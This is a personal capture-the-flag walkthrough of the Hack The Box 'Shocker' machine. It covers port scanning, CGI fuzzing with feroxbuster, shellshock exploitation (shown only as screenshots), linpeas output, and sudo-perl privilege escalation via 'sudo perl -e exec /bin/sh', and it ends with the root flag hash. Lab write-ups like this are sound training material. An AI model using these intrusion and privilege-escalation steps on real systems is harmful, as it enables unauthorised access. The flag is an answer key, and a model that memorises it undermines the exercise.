After a port scan, there are only 2 ports exposed  

- 2222: ssh
- 80: apache webserver

## Enumeration

### What does it do?

I've only been able to see the homepage `index.html` which appears to be a static page with a picture of a bug about to squash itself.

There is an ETag: `"89-559ccac257884"` but it doesn't seem to decode to anything useful.



### What language is it written in?

403 errors on aspx, asp, jsp, php.

### What server software is the application running on?

Apache httpd 2.4.18 ((Ubuntu))



## Walkthrough
I peaked at the walkthrough because I was lost.
No shocker - this machine was built to practice shellshock
On apache, the `cgi-bin` folder contains scripts. The scripts are accessed via web, run server side, then returned with an HTTP reply. Shellshock provides input that hijacks the server-side shell run.

I also saw in the walkthrough that the target script is `/cgi-bin/user.sh`. But I want to prove this with a scan.

## fuzzing for shellshock
Found a shellshock endpoint by running
```bash
feroxbuster -u http://10.10.10.56:80/cgi-bin/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "sh" -v -k -n -o /home/nate/hackthebox/shocker/results/scans/tcp80/tcp_80_http_feroxbuster_cgi-bin.txt
```
![[Pasted image 20220106200355.png]]


Now to exploit it.
![[Pasted image 20220106200636.png]]

![[Pasted image 20220106202024.png]]

![[Pasted image 20220106204959.png]]

I was able to get user.txt but not enough privs for root.txt

### Linpeas findings

> Sudo version 1.8.16

> ╔══════════╣ Executing Linux Exploit Suggester 2
> ╚ https://github.com/jondonas/linux-exploit-suggester-2  
>   
> [1] af_packet  
> 	CVE-2016-8655  
> 	Source: http://www.exploit-db.com/exploits/40871  
> [2] exploit_x  
> 	CVE-2018-14665  
> 	Source: http://www.exploit-db.com/exploits/45697  
> [3] get_rekt  
> 	CVE-2017-16695  
> 	Source: http://www.exploit-db.com/exploits/45010  

> ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
> ╚https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
> Matching Defaults entries for shelly on Shocker:  
> env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
> 
> User shelly may run the following commands on Shocker:  
> (root) NOPASSWD: /usr/bin/perl 

Might be able to use the following from GTFO bins to get root.
```
sudo perl -e 'exec "/bin/sh";'
```

![[Pasted image 20220106210114.png]]

## Root Flag
`52c2715605d70c7619030560dc1ca467`